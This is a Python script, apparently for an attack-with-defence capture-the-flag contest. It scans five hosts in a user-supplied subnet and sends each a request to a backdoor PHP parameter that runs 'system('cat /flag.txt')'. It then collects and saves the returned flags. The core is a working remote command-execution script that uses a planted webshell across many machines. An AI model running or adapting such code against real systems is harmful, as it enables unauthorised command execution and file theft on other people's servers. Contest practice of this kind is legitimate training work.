import requests
from bs4 import BeautifulSoup
import re

def filter_tags(htmlstr):
    #先过滤CDATA
    re_cdata=re.compile('//<!\[CDATA\[[^>]*//\]\]>',re.I) #匹配CDATA
    re_script=re.compile('<\s*script[^>]*>[^<]*<\s*/\s*script\s*>',re.I)#Script
    re_style=re.compile('<\s*style[^>]*>[^<]*<\s*/\s*style\s*>',re.I)#style
    re_br=re.compile('<br\s*?/?>')#处理换行
    re_h=re.compile('</?\w+[^>]*>')#HTML标签
    re_comment=re.compile('<!--[^>]*-->')#HTML注释
    s=re_cdata.sub('',htmlstr)#去掉CDATA
    s=re_script.sub('',s) #去掉SCRIPT
    s=re_style.sub('',s)#去掉style
    s=re_br.sub('\n',s)#将br转换为换行
    s=re_h.sub('',s) #去掉HTML 标签
    s=re_comment.sub('',s)#去掉HTML注释
    blank_line=re.compile('\n+')
    s=blank_line.sub('\n',s)
    s=replaceCharEntity(s)#替换实体
    return s

def replaceCharEntity(htmlstr):
    CHAR_ENTITIES={'nbsp':' ','160':' ',
        'lt':'<','60':'<',
        'gt':'>','62':'>',
        'amp':'&','38':'&',
        'quot':'"','34':'"',}
 
    re_charEntity=re.compile(r'&#?(?P<name>\w+);')
    sz=re_charEntity.search(htmlstr)
    while sz:
        entity=sz.group()#entity全称，如>
        key=sz.group('name')#去除&;后entity,如>为gt
        try:
            htmlstr=re_charEntity.sub(CHAR_ENTITIES[key],htmlstr,1)
            sz=re_charEntity.search(htmlstr)
        except KeyError:
            #以空串代替
             htmlstr=re_charEntity.sub('',htmlstr,1)
             sz=re_charEntity.search(htmlstr)
    return htmlstr

def catflag():
    IP=input("输入IP地址部分段(如192.168.132.空):")
    for i in range(35,40):
        try:
            i=str(i)
            NewIP=IP+i
            target = "http://"+NewIP+"/.Index.php?1998=system(%27\cat%20/flag.txt%27);"
            req = requests.get(url=target,timeout=2)
            html = req.text
            bf = str(BeautifulSoup(html))
            checks=filter_tags(bf)
            flag=('IP为:'+NewIP+':'+checks)
            print(flag)
            N=flag.find('404 Not Found')
            print(N)
            if N<0:
                f.write(flag)
            else:
                pass
        except:
            pass

if __name__=='__main__':
    f=open('F:/Python3.0Work/AWD/flag.txt','w')
    catflag()
    f.close()